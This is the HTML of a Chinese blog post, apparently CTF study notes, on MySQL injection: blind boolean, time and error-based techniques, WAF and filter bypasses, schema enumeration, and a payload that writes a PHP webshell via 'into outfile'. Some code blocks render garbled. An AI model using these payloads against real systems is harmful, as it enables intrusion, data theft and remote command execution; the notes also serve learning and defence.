@@ -1,0 +1,725 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="对ctf题目中盲注思路以及waf绕过的总结 sqlmap的参数学习（算了不写了，直接看小m师傅的吧，文笔比我好多了。。http://www.melodia.pw/?p=918） 其他不好分类的，零碎想记录的">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql注入学习（持续保持更新）">
+<meta property="og:url" content="https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/index.html">
+<meta property="og:site_name" content="Yiruma">
+<meta property="og:description" content="对ctf题目中盲注思路以及waf绕过的总结 sqlmap的参数学习（算了不写了，直接看小m师傅的吧，文笔比我好多了。。http://www.melodia.pw/?p=918） 其他不好分类的，零碎想记录的">
+<meta property="og:updated_time" content="2017-08-30T11:41:39.643Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mysql注入学习（持续保持更新）">
+<meta name="twitter:description" content="对ctf题目中盲注思路以及waf绕过的总结 sqlmap的参数学习（算了不写了，直接看小m师傅的吧，文笔比我好多了。。http://www.melodia.pw/?p=918） 其他不好分类的，零碎想记录的">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/"/>
+
+
+
+
+
+  <title>mysql注入学习（持续保持更新） | Yiruma</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yiruma</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            Über
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            menu.link
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/07/23/mysql注入学习（持续更新中）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yiruma">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yiruma">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">mysql注入学习（持续保持更新）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-23T13:53:32+08:00">
+                2017-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>对ctf题目中盲注思路以及waf绕过的总结</li>
+<li>sqlmap的参数学习（算了不写了，直接看小m师傅的吧，文笔比我好多了。。<a href="http://www.melodia.pw/?p=918" title="SQLMAP 人工辅助注入简介" target="_blank" rel="external">http://www.melodia.pw/?p=918</a>）</li>
+<li>其他不好分类的，零碎想记录的<a id="more"></a>
+</li>
+</ul>
+<h2 id="第一步：字符串截取函数"><a href="#第一步：字符串截取函数" class="headerlink" title="第一步：字符串截取函数"></a>第一步：字符串截取函数</h2><p><em>选取那个完全由过滤了什么符号决定，一般查看的有：函数名，逗号，空格</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">substring((select xxx) from -1|-2|-3... for 1)</div><div class="line">substr((select xxx) from -1|-2|-3... for 1)</div><div class="line">mid((select xxx) from -1|-2|-3... for 1)</div><div class="line">过滤少的时候可以使用((select xxx),1|2|3...,1)的原始形式</div><div class="line"></div><div class="line">left((select xxx),2)</div><div class="line">right((select xxx),2)</div><div class="line">right(left((select xxx)，1|2|3...),1)</div></pre></td></tr></table></figure></p>
+<h2 id="第二步：将截取到的字符串段进行比较得到另一个数据"><a href="#第二步：将截取到的字符串段进行比较得到另一个数据" class="headerlink" title="第二步：将截取到的字符串段进行比较得到另一个数据"></a>第二步：将截取到的字符串段进行比较得到另一个数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">substring [=|like] [&apos;&apos;|0xxxx]本身的结果就已经是用0，1 表示了</div><div class="line">(if(substring [=|like] [&apos;&apos;|0xxxx], 0,1))</div><div class="line">(select case when (substring [=|like] [&apos;&apos;|0xxxx]) then 0 else 1 end)</div><div class="line"></div><div class="line">使用binary()来比较，来区分大小写</div></pre></td></tr></table></figure>
+<h2 id="第三步：产生两种结果"><a href="#第三步：产生两种结果" class="headerlink" title="第三步：产生两种结果"></a>第三步：产生两种结果</h2><h3 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h3><p>判断结果的0或1或产生两种不同的回显结果，这就是bool型盲注思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">where user=&apos;&apos; or [0|1] and &apos;&apos;=&apos;&apos;  三者作为比较运算的条件</div><div class="line">where user=&apos;0&apos;+[0|1]+&apos;0&apos;			三者作为运算结果，如果为&apos;0&apos;将匹配所有字符串，如果为&apos;1&apos;则匹配不了字符串，能够省略and等运算符</div></pre></td></tr></table></figure></p>
+<h3 id="基于time的盲注"><a href="#基于time的盲注" class="headerlink" title="基于time的盲注"></a>基于time的盲注</h3><p>如果满足条件就sleep上一段时间，如果没有就不sleep，然后通过计算处理时间来得到两种回显结果<br>一般insert语句这种不会有文字回显的采用基于time盲注的两种情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#需要注意一点的是，这里的重点不是让条件等式的结果为0或1，只要让等式中sleep的那一段运行就好</div><div class="line">where user=&apos;&apos; or [sleep(5)|sleep(0)] and &apos;&apos;=&apos;&apos;</div></pre></td></tr></table></figure></p>
+<h3 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h3><p>如果环境会在数据库操作错误时把错误抛出，那么就可以考虑在[0/1]的两种情况下是否会运行接下来<code>and 报错函数</code> 来产生报错来构造出两种回显情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#报错函数有很多，如果发现被过滤可以寻找替换的方式</div><div class="line">select 1 from users where [0/1] and ST_LatFromGeoHash(version());</div></pre></td></tr></table></figure></p>
+<h3 id="还有一些有意思的产生两种回显的trick"><a href="#还有一些有意思的产生两种回显的trick" class="headerlink" title="还有一些有意思的产生两种回显的trick"></a>还有一些有意思的产生两种回显的trick</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">where user=&apos;admin&apos; union select 1,2,3 order by 3 desc;   </div><div class="line">这种方式通过union一个select来使得输出表产生两行，然后因为自动排序的原因导致第一行总是最小值，</div><div class="line">所以这就产生了两种情况</div></pre></td></tr></table></figure>
+<h2 id="sql过滤统计"><a href="#sql过滤统计" class="headerlink" title="sql过滤统计"></a>sql过滤统计</h2><p>反正过滤吧，不是想办法绕过，就是再找一个相同功能的写法来替换</p>
+<p><strong>过滤单引号</strong></p>
+<ul>
+<li>在数据库为gbk编码下可以考虑宽字节注入%df%27来用%df吃掉\</li>
+<li>因为单引号被过滤无法<code>where user=&#39;admin&#39;</code>的时候，用0x写法来代替’’写法</li>
+</ul>
+<p><strong>过滤空格</strong><br>本质上就是用一些无法融入原写法语义的符号放到那里起到空格的分隔作用</p>
+<ul>
+<li>使用<code>()</code>来做分隔,形如select(*)from(user)的写法，</li>
+<li>sqlmap中space2hash.py的方法，用%23xxx%0a来做空格</li>
+<li>使用<code>/**/</code>来做分隔</li>
+<li>使用%0a来做分隔</li>
+</ul>
+<p><strong>过滤某些sql语句的关键字</strong></p>
+<ul>
+<li><code>/*!*/</code>来在php中注释过去，但是mysql中会正常执行，形如<code>/*!select*/ flag /*!from*/ flag</code></li>
+<li>中间插入<code>%0a  %0b  %00  /**/</code>这些,形如<code>se%0blect fl/**/ag from flag</code>，但有一点要提醒的是，<code>sel/**/ect</code>这种写法并不是说可以绕过检测而且mysql可以执行，<code>%0b /**/</code>这些字符在sql语句中是存在的，在php那一层就会剔除掉</li>
+<li>考虑大小写绕过SeLect</li>
+<li>最常见的双写绕过的可能千万不要忘了尝试下 <code>selselelctect</code></li>
+</ul>
+<p><strong>过滤某些符号</strong><br>符号的过滤与关键字过滤不同，大部分情况无法进行过滤绕过，多为寻求符号的替代品</p>
+<ul>
+<li>使用greatest来替代大小写符号<code>ascii(mid(user(),1,1)) &lt; 150</code>–&gt;<code>greatest(ascii(mid(user(),1,1)),150)=150</code></li>
+<li>过滤了逗号，使用<code>substring((select xxx) from -1|-2|-3... for 1)</code>来代替<code>((select xxx),1|2|3...,1)</code></li>
+</ul>
+<p><strong>末尾截断可用的注释（然而我比较习惯用’’=’）</strong></p>
+<ul>
+<li><code>%23  也就是#</code></li>
+<li><code>--+</code>  注意这里应该用+来代替最后一个空格字符，测试中– 没有成功</li>
+<li><code>;%00</code></li>
+<li><code>/*</code>没有测试成功</li>
+<li><figure class="highlight plain"><figcaption><span>```没有测试成功</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">**过滤某些函数**</div><div class="line">这不是大事，基本上都能找到相同功能的函数来代替，mysql函数那么多。。。</div><div class="line"></div><div class="line">**一些字段关键字被过滤**</div><div class="line">- 和关键子过滤一样，使用`/**/ %0b %0a`这些来中间断一下</div><div class="line">- 大小写也是没有问题的，反正mysql对大小写也不敏感</div><div class="line">- 使用concat(&apos;adm&apos;+&apos;in&apos;)就可以，但注意mysql中写成&apos;adm&apos;+&apos;in&apos;的结果是0。。。小心不要错了</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">## sql盲注的注意事项</div><div class="line">最要紧的就是 = &apos;i&apos;或是0x表示，经常在payload里面写成 = &#123;&#125;，应该是 = &apos;&#123;&#125;&apos;</div><div class="line">mysql的单字符比较中不区分大小写，应该使用binary()或者ascii()来区分大小写</div><div class="line"></div><div class="line"></div><div class="line">## sql盲注其他用到的点</div><div class="line">- group_concat()将一列数据整合</div><div class="line">- 用来写文件 </div><div class="line">  `union select &quot;&lt;?php system($_GET[‘c’]);?&gt;&quot; into outfile &apos;/var/www/html/uploads/xie.php&apos;`</div><div class="line">- 获取数据库 `select database()`</div><div class="line">- 获取数据库中的表 </div><div class="line">  `select group_concat(table_name) from information_schema.tables where table_schema = &apos;news&apos;`</div><div class="line">- 获取表中的对应列</div><div class="line">  `select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;` </div><div class="line"></div><div class="line"></div><div class="line">## 无法使用information_schema下或者无法写column_name,table_name下获取库名表名列名</div><div class="line">### 无法使用information_schema因而不知道列名,或者无法禁用列名相关字段</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>select <em> from user union<br> select (select 1)a,(select 2)b,(select 3)c,<br>    (select e.4 from (select </em> from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 1)d;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">**大致的解释：**</div><div class="line">因为不能使用列名，所以通过语句`select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user`来建立一个形如</div></pre></td></tr></table></figure></p>
+<p>+——————+———————————-+———————+——-+<br>| 1                | 2                                | 3                   | 4     |<br>+——————+———————————-+———————+——-+<br>| 1                | 2                                | 3                   | 4     |<br>| SometimesSomeone | dd9d15d993d6f42f896ab4ba09a6a695 | 13512279197@163.com | user  |<br>| 11               | 56057a4f4e475d73e48824acf8b54098 | 123@12              | user  |<br>| admin            | 6b9412ec641f16892544154952fc8b1d | 13512279197@163.com | admin |<br>+——————+———————————-+———————+——-+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">这样的表，我们假设表叫e，之后`select e.3 from (e的建表语句) limit 1 offset 3`就可以的拿到admin那一行的密码，所以上述语句的返回结果是个变量，然后我们接着构造</div><div class="line">还是使用`select (select 1)a,(select 2)b,(select 3)c,(select 4)d`的方法，把这个变量替换掉`(select 1)a`或者其他变量，所以现在拿到的就是一行数据</div><div class="line">之后就可以用union来与之前的联系起来了</div><div class="line"></div><div class="line">### 通过构造错误拿到库名表名列名</div><div class="line">1、</div></pre></td></tr></table></figure></p>
+<p>select * from user where username=’admin’-c();<br>output: ERROR 1305 (42000): FUNCTION blog.c does not exist<br>成功拿到库名blog，因为一个库中存在不同的系统或自定义函数，若要调用的函数不存在，就会报出此数据库中<br>没有这个函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2、</div></pre></td></tr></table></figure></p>
+<p>select * from user where username=’’ and Polygon(user);<br>output: ERROR 1367 (22007): Illegal non geometric ‘<code>blog</code>.<code>user</code>.<code>username</code>‘<br>                            value found during parsing<br>可以成功爆出当前的库表列，比较不实用的就是需要猜中其中一个column的名字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">3、</div></pre></td></tr></table></figure></p>
+<p>select <em> from user where username=’’ and<br> (select </em> from<br>    (select <em> from user as a join user as b [开始为空之后逐个为using(爆出的column)])<br>  as e);<br>output: ERROR 1060 (42S21): Duplicate column name ‘password’<br>可以爆出所有的字段名，原理：select table as c时是要求table中不能有重复列的，<br>先使用select </em> from user as a join user as b 构建出有重复列的表，之后select 这个表 as c即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在能够使用的注入点将要拿的数据先存到变量里，之后被限制的注入点读取变量即可</div></pre></td></tr></table></figure></p>
+<p> select * from user where username=’admin’ into @a,@b,@c,@d;<br>之后读取@a @b @c @d 这四个变量就可以了<br>```</p>
+<h2 id="一些零碎记录的点"><a href="#一些零碎记录的点" class="headerlink" title="一些零碎记录的点"></a>一些零碎记录的点</h2><ol>
+<li><p>针对sql注入做的waf防护，常见的有以下几种</p>
+<ul>
+<li>采用mysqli_escape_string(),addslashes()这种转义型的过滤，如果没有其他额外人为操作的话，在这个sql点就是安全，那仍然会保留’这种脏数据，所以要留意会不会在其他sql点造成二次注入</li>
+<li>自己写filter函数，对某些关键字啊，空格啊，符号啊禁用，也是常常产生绕过的地方，比如双写绕过啊，使用其他相同意义的函数啊，空格用%0a代替啊这些。一些比较奇葩的过滤规则可能会引入威胁，就比如国赛帽子的那道题目</li>
+<li>waf函数，如果检测到敏感字符会die掉进程，也是经常进行绕过的地方</li>
+<li>使用PDO结构的sql对象，进行-&gt;perpare预处理之后，那参数就是参数，语句就是语句，基本很难形成注入</li>
+</ul>
+</li>
+<li><p>除了针对各种sql点上过滤的绕过，还有几种情况是值得考虑的</p>
+<ul>
+<li>如果参数其实并没有被过滤呢？就像TCTF上那道题目，全局参数过滤了GET POST ,然而一个参数点使用的是REQUEST[‘username’]来获得的参数，那其实这注入点的参数并没有被过滤</li>
+<li>有些注入点的参数并不是自定义的，但有可能其最终来源还是用户自定义的，而且来源收录的时候只是进行了转义，记录的数据仍然为脏数据，这样这些存储值不经过滤的传到其他注入点做参数就会构成二次注入。（个人感觉二次注入在黑盒审计中出现的场景比代码审计要多，而且经常出现在用户名注册，之后一些操作直接提取用户名去进行sql操作）</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/11/全国大学生信息安全竞赛web部分wp/" rel="prev" title="全国大学生信息安全竞赛web部分wp">
+                全国大学生信息安全竞赛web部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Yiruma" />
+          <p class="site-author-name" itemprop="name">Yiruma</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">Artikel</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一步：字符串截取函数"><span class="nav-number">1.</span> <span class="nav-text">第一步：字符串截取函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二步：将截取到的字符串段进行比较得到另一个数据"><span class="nav-number">2.</span> <span class="nav-text">第二步：将截取到的字符串段进行比较得到另一个数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三步：产生两种结果"><span class="nav-number">3.</span> <span class="nav-text">第三步：产生两种结果</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于bool的盲注"><span class="nav-number">3.1.</span> <span class="nav-text">基于bool的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于time的盲注"><span class="nav-number">3.2.</span> <span class="nav-text">基于time的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错的盲注"><span class="nav-number">3.3.</span> <span class="nav-text">基于报错的盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#还有一些有意思的产生两种回显的trick"><span class="nav-number">3.4.</span> <span class="nav-text">还有一些有意思的产生两种回显的trick</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql过滤统计"><span class="nav-number">4.</span> <span class="nav-text">sql过滤统计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些零碎记录的点"><span class="nav-number">5.</span> <span class="nav-text">一些零碎记录的点</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiruma</span>
+</div>
+
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
